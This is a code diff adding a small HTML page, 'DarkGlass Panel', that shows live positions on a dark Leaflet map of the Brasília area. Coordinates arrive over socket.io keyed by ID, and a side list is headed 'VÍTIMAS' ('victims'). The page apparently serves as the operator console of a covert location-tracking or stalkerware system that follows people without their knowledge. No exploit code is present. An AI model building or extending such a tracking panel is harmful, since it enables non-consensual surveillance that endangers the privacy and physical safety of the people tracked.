@@ -1,0 +1,39 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>DarkGlass Panel</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+  <style>
+    body{margin:0;background:#111;color:#0ff;font-family:monospace}
+    #map{height:100vh}
+    .glass{
+      position:absolute;top:15px;left:15px;z-index:999;
+      background:rgba(0,0,0,.5);backdrop-filter:blur(6px);
+      padding:12px;border-radius:8px;border:1px solid #0ff
+    }
+  </style>
+</head>
+<body>
+  <div id="map"></div>
+  <div class="glass"><h3>🔴 VÍTIMAS</h3><ul id="list"></ul></div>
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const map = L.map('map').setView([-15.8,-47.9], 10);
+    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
+    const socket = io();
+    const markers = {};
+    socket.on('pos', d => {
+      if(!markers[d.id]){
+        markers[d.id] = L.marker([d.lat, d.lon]).addTo(map)
+          .bindPopup(`ID: ${d.id}`);
+      }else{
+        markers[d.id].setLatLng([d.lat, d.lon]);
+      }
+      document.getElementById('list').innerHTML =
+        Object.keys(markers).map(k=>`<li>${k}</li>`).join('');
+    });
+  </script>
+</body>
+</html>
